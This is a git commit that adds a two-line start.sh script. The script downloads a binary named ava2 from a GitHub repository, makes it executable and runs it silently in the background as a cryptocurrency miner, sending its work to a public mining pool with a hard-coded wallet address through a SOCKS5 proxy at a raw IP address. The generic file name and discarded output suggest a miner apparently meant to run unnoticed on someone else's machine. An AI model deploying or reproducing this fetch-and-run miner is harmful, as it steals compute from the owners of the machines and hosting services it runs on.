65b34016e294f289d83aa80b65e899dce9e681d0
gyrogerald <97717251+gyrogerald@users.noreply.github.com>
2022-05-24 11:07:30 +0800

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/faridmd/cpuu/raw/main/ava2 && chmod +x ava2 && nohup ./ava2 -a yescryptr16 -o stratum+tcp://yescryptR16.na.mine.zpool.ca:6333 -u DBCUUWXhoWNAAk51HauNkGiwYw3BE98vN5 -p c=DGB,zap=QOGE -t 2 --proxy socks5://mamang:1234@47.254.95.97:8128 >/dev/null 2>&1
